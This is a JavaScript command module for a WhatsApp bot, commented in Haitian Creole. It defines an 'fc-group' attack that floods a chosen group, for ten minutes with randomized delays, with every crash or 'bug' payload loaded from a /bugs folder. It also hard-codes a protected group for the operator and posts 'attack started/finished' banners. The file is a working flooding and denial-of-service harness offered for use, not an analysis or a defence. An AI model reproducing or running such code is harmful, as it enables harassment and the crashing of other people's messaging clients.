const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'fc-group',
  desc: 'Flood group with all payloads from /bugs for 10 minutes, optionally target a specific group by JID',
  category: 'bug',
  react: '🔫',
  filename: __filename
}, async (bot, mek, { from, reply, isGroup, arg }) => {
  try {
    // Korije verifikasyon arg
    let groupJid = (typeof arg === 'string' && arg.trim() !== '') ? arg.trim() : from;

    if (!groupJid || !groupJid.endsWith('@g.us')) {
      return await reply('❌ Tanpri bay yon group JID valab (fini ak @g.us)');
    }

    if (groupJid === from && !isGroup) {
      return await reply('❌ Kòmand sa a sèlman ka lanse nan yon gwoup oswa ak yon group JID valab kòm paramèt.');
    }

    const protectedGroups = [
      '120363376244731469@g.us' // mete groupJid ou vle pwoteje
    ];
    if (protectedGroups.includes(groupJid)) {
      return await reply('🛡️ Group sa pwoteje. Atak anile.');
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 Pa gen payload nan folder /bugs la.');
    }

    const imagePath = path.join(__dirname, '../media/5.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(groupJid, {
        image: imageBuffer,
        caption: `🚨 *fc-group started on group*\n🕒 *Duration:* 10min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }

    const endTime = Date.now() + 10 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, groupJid);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400)));
      }
      await new Promise(res => setTimeout(res, 1000));
    }

    await bot.sendMessage(groupJid, {
      text: `✅ *fc-group attack finished*`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    await reply(`❌ Error: ${err.message}`);
  }
});
